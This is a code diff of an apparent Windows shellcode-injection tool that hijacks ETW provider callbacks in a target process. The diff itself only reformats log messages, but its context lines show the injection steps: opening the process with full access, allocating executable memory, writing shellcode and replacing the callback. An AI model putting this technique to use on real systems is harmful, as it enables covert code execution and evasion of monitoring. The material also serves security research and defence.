@@ -395,7 +395,7 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
     // try read shellcode into memory
     plen = readpic(path, &pdata);
     if(plen == 0) { 
-      wprintf(L"ERROR: Unable to read shellcode from %s\n", path); 
+      wprintf(L"  [ ERROR: Unable to read shellcode from %s\n", path); 
       return FALSE; 
     }
     
@@ -403,12 +403,13 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
     etw = etw_get_table_va();
     
     if(etw == NULL) {
-      wprintf(L"ERROR: Unable to obtain address of ETW Registration Table.\n");
+      wprintf(L"  [ ERROR: Unable to obtain address of ETW Registration Table.\n");
       return FALSE;
     }
     
     wprintf(L"*********************************************\n");
-    wprintf(L"  [ EtwpRegistrationTable for %i found at %p\n", pid, etw);  
+    wprintf(L"  [ The EtwpRegistrationTable in %s:%i was found at %p\n\n", 
+      pid2name(pid), pid, etw);
     
     // try open target process
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -431,8 +432,8 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
       StringFromGUID2(&re.ProviderId, id, sizeof(id));
       name = etw_id2name(id);
         
-      wprintf(L"Address of remote node  : %p\n", (PVOID)node);
-      wprintf(L"Using %s (%s)\n", id, name);
+      wprintf(L"  [ Address of remote node  : %p\n", (PVOID)node);
+      wprintf(L"  [ Using %s (%s)\n", id, name);
       
       // allocate memory for shellcode
       cs = VirtualAllocEx(
@@ -441,8 +442,8 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
         PAGE_EXECUTE_READWRITE);
         
       if(cs != NULL) {
-        wprintf(L"Address of old callback : %p\n", re.Callback);
-        wprintf(L"Address of new callback : %p\n", cs);
+        wprintf(L"  [ Address of old callback : %p\n", re.Callback);
+        wprintf(L"  [ Address of new callback : %p\n", cs);
         
         // write shellcode
         WriteProcessMemory(hp, cs, pdata, plen, &wr);
@@ -492,7 +493,7 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
         VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
       }        
     } else {
-      wprintf(L"ERROR: Unable to get registration entry.\n");
+      wprintf(L"  [ ERROR: Unable to get registration entry.\n");
     }
     CloseHandle(hp);
     return status;
@@ -591,7 +592,7 @@ VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
     etw = etw_get_table_va();
     
     if(etw == NULL) {
-      wprintf(L"ERROR: Unable to resolve address of ETW registration table.\n");
+      wprintf(L"  [ ERROR: Unable to resolve address of ETW registration table.\n");
       return;
     }
     
@@ -724,8 +725,7 @@ int wmain(int argc, WCHAR *argv[]) {
     
     // inject code?
     if(opt & ETW_OPT_INJECT) {
-      wprintf(L"  [ STATUS: Injection into %s : %s.\n", 
-        process, 
+      wprintf(L"  [ STATUS: %s.\n", 
         etw_inject(pid, file, prov) ? L"complete" : L"failed");
     } else {
       // perform a search or disable providers
